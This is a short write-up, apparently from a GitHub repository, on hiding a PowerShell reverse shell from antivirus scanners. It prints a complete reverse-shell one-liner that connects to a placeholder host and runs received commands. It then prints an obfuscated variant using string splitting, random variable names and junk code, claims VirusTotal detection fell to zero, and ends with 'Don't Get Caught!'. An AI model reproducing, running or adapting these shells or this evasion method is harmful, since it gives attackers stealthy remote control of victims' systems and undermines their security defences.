# Powershell_Obfuscation_WriteUP

**For Research Purposes Only!!**

Hello All,
I want to start with my limitations.
In order to test this all I did was save the reverse shells as .ps1 script files and pass them to Virustotal.
This does not take into play AMSI and othe AI based tools watching the commands in a target's environment. Much more testing needs to be done before applying to your target.

That being said my first step was save a standard powershell reverse shell as a powershell script (Command Below) and pass to VirusTotal. I received the results in the screenshot below.

Powershell Reverse Shell:
#powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


![Settings Window](https://github.com/jwfawcett/Powershell_Obfuscation_WriteUP/blob/main/exprevshellvt.png)

It was 24 out of 62 Antirus Solutions that caught it. Seems low but once again other solutions are used such as AMSI to and AI to catch this. 

Next I tried adding common obfuscation techniques such as String Concatenation, Camel Case, Randomized Variables, and extra "Junk".
I also saved as a .ps1 file and passed to Virustotal. I got the results in the screenshot below. I also added the newly obfuscated command below.

Powershell Obfuscated Reverse Shell:
pOwersheLl -NOp -C ($s9QHHzUw + (' = N'+'ew'+'-O'+'bjec'+'t System'+'.N'+'et.Socke'+'ts.T'+'CPClien'+'t'+'(''10.10.'+'10.10'','+'1337)'+';') + $Hy4DS + (' '+'='+' ') + $s9QHHzUw + (-join('.GetStre','a','m','();[byt','e[]',']')) + $oJ7efA + (-join(' = 0..6','5535|%{0','};whil','e','((')) + $E6Ix + (' ='+' ') + $Hy4DS + (-join('.Re','ad(')) + $oJ7efA + (-join(',',' ','0',',',' ')) + $oJ7efA + ('.Length)'+') -ne '+'0)'+'{;') + $zM2tNyYo + (' = ('+'New-Obj'+'ect -T'+'yp'+'eN'+'ame'+' System'+'.Text.AS'+'CIIEn'+'cod'+'ing).'+'GetStri'+'ng'+'(') + $oJ7efA + (-join(',','0',',',' ')) + $E6Ix + ');' + $gfu21 + (' '+'= '+'(iex'+' ') + $zM2tNyYo + (' 2>&'+'1 | Out-'+'St'+'ri'+'ng'+' '+')'+';') + $xXtbhTK + (-join(' =',' ')) + $gfu21 + (-join(' + ''PS ','''',' + (p','wd',').Path ','+ ''','> '';')) + $Hu3Q4Qq + (' = (['+'text.en'+'c'+'oding]:'+':ASCII)'+'.GetByt'+'e'+'s'+'(') + $xXtbhTK + ');' + $Hy4DS + ('.Wri'+'te'+'(') + $Hu3Q4Qq + (','+'0,') + $Hu3Q4Qq + ('.L'+'e'+'ng'+'th);') + $Hy4DS + (-join('.Flu','sh(',')','}',';')) + $s9QHHzUw + ('.Clo'+'se()'))
if (76 -gt 2) { Write-Host "." -NoNewline } else { Write-Host "," -NoNewline }; Write-Host ""


![Settings Window](https://github.com/jwfawcett/Powershell_Obfuscation_WriteUP/blob/main/obfuscatedshell2.png)

POOF! Down to Zero. Once again much more testing needs to be done. But this may show (for now) that even some basic obfuscation techniques could be the difference between a compromise or a fail.
Have Fun and Don't Get Caught!
